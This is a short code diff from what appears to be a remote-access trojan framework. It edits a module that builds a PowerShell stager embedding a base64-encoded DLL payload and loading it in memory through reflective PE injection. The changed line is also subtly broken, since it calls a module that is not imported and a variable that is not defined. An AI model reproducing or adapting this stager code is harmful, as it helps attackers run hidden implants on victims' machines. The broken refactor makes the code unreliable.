@@ -4,7 +4,7 @@ from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
 import os.path
 from pupylib.utils.term import colorize
 import random, string
-from pupygen import get_edit_pupyx86_dll
+from pupygen import generate_binary_from_template
 from pupylib.PupyConfig import PupyConfig
 from ssl import wrap_socket
 from base64 import b64encode
@@ -34,7 +34,7 @@ def getInvokeReflectivePEInjectionWithDLLEmbedded(payload_conf):
     $PEBytesTotal = [System.Convert]::FromBase64String({1})
     Invoke-ReflectivePEInjection -PEBytes $PEBytesTotal -ForceASLR
     """#{1}=x86dll
-    binaryX86=b64encode(get_edit_pupyx86_dll(payload_conf))
+    binaryX86=b64encode(pupygen.generate_binary_from_template(conf, 'windows', arch='x86')[0])
     binaryX86parts = [binaryX86[i:i+SPLIT_SIZE] for i in range(0, len(binaryX86), SPLIT_SIZE)]
     for i,aPart in enumerate(binaryX86parts):
         x86InitCode += "$PEBytes{0}=\"{1}\"\n".format(i,aPart)
